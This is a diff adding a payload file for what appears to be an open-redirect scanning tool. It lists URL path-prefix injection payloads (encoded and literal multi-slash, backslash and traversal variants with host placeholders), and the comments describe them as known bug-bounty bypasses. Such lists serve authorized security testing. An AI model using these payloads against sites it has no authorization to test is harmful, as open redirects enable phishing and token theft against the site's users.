@@ -1,0 +1,52 @@
+# =============================================================================
+# PATH-PREFIX INJECTION PAYLOADS
+#
+# These are NOT injected into a query parameter value. They are inserted
+# directly into the URL PATH, right after scheme://host and before the
+# site's real path, e.g.:
+#
+#   https://target-site.tld/%2f%2f%2fexample.org%2f%3f?category=interview&page=2
+#   https://target-site.tld//203.0.113.10/calendar
+#   https://target-site.tld/%2Ftracking-id-12345
+#
+# This bug class doesn't need any query parameter at all - it exploits how
+# the server/framework parses the path itself before routing, so the tool
+# tests it against EVERY input URL regardless of whether it has params.
+# Disable with --skip-path-injection if you only care about query params.
+#
+# Same classification rule as payloads.txt: presence of {TARGET} -> Stage 2.
+# =============================================================================
+
+# --- Encoded multi-slash prefix (a reported bypass pattern) ---
+/%2f%2f%2f{HOST}%2f%3f
+/%2f%2f{HOST}%2f%3f
+/%2f{HOST}%2f%3f
+
+# --- Literal double/triple-slash prefix, no encoding needed at all (a
+#     reported bypass on a real bug bounty program: the app's own path
+#     routing treated multiple leading slashes as the start of a new host,
+#     with NO encoding required - this is one of the most-reported
+#     real-world open redirect patterns and belongs at the top of the list) ---
+//{HOST}/
+//{HOST}
+///{HOST}/
+///{HOST}
+////{HOST}/
+////{HOST}
+
+# --- Single encoded-slash prefix (reported bypass) ---
+/%2F{HOST}
+/%2f{HOST}
+
+# --- Backslash variants ---
+/\{HOST}
+/\/\{HOST}
+
+# --- With trailing decoy of the real target domain, mimicking a reported
+#     PoC structure (path payload + fake query referencing TARGET) ---
+/%2f%2f%2f{HOST}%2f%3f{TARGET}
+/%2f{HOST}%2f%3f{TARGET}
+
+# --- Path traversal into an absolute redirect ---
+/..//{HOST}
+/../{HOST}
